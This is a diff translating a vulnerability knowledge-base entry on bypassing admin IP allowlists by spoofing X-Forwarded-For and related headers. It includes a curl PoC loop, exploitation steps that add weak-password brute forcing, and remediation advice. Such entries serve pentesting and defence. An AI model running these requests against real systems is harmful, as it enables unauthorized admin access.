@@ -1,55 +1,55 @@
 ﻿---
-title: 后台 IP 白名单绕过（X-Forwarded-For 伪造内网来源）
-cve: 无（实现缺陷）
+title: Admin IP allowlist bypass (spoofing an internal source with X-Forwarded-For)
+cve: None (implementation flaw)
 severity: high
 cvss: 8.4
-product: 自研后台网关（只校验 XFF 或只查首段 IP）
-versions: 任意
+product: Custom admin gateway (checks only XFF or the first IP)
+versions: Any
 ports: 80, 443
-keywords: 白名单, ip, xff, 绕过, 后台, 内网
-entry: 403 页面 + 只允许 127.0.0.1/内网段
+keywords: allowlist, ip, xff, bypass, admin, internal network
+entry: 403 page + access restricted to 127.0.0.1/internal ranges
 verified: false
-sources: 公开资料整理（实现缺陷类）
+sources: Compiled from public sources (implementation flaws)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
-GET /admin/            → 403 "仅允许内网访问"
-GET /admin/ (带 XFF)   → 200 = 可绕
+GET /admin/            → 403 "Internal access only"
+GET /admin/ (with XFF) → 200 = bypass possible
 ```
 
-## 前置条件
+## Prerequisites
 
-- 后台只按请求头或首段 IP 判断来源。
+- The backend determines the source solely from request headers or the first IP.
 
 ## PoC
 
 ```bash
-# 1) 逐个头试（多数只信任 XFF 第一个值）
+# 1) Try headers individually (most trust only the first XFF value)
 for h in 'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Forwarded-For: 10.0.0.1' \
          'Client-IP: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' 'Forwarded: for=127.0.0.1'; do
   code=$(curl -s -o /dev/null -w '%{http_code}' -H "$h" 'https://target/admin/')
   echo "$code  $h"
 done
-# 判定：出现 200/302 到后台 = 绕过成功
+# Result: 200/302 to the admin backend = successful bypass
 
-# 2) 多值伪装（真实 IP 在后面）
+# 2) Spoof multiple values (real IP comes last)
 curl -s -o /dev/null -w '%{http_code}\n' \
   -H 'X-Forwarded-For: 127.0.0.1, 203.0.113.9' 'https://target/admin/'
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先确认 403 的判定文字；
-2. 逐个头试，命中后直接打后台登录/接口；
-3. 与弱口令组合（白名单绕过后爆破才有意义）；
-4. 证据：403 与 200 的两条响应头对比。
+1. First confirm the text explaining the 403 denial;
+2. Try each header; after a successful bypass, access the admin login/endpoints directly;
+3. Combine with weak passwords (brute forcing only becomes meaningful after bypassing the allowlist);
+4. Evidence: compare the response headers for a 403 and a 200.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 只信反代写入的固定头并要求覆盖；内网判定用 TCP 源 IP；后台独立内网入口。
+- Trust only a fixed header written by the reverse proxy and require it to overwrite existing values; use the TCP source IP for internal-network checks; provide a separate internal admin entry point.
 
-## 参考
+## References
 
-- OWASP 访问控制；CWE-290。
+- OWASP Access Control; CWE-290.
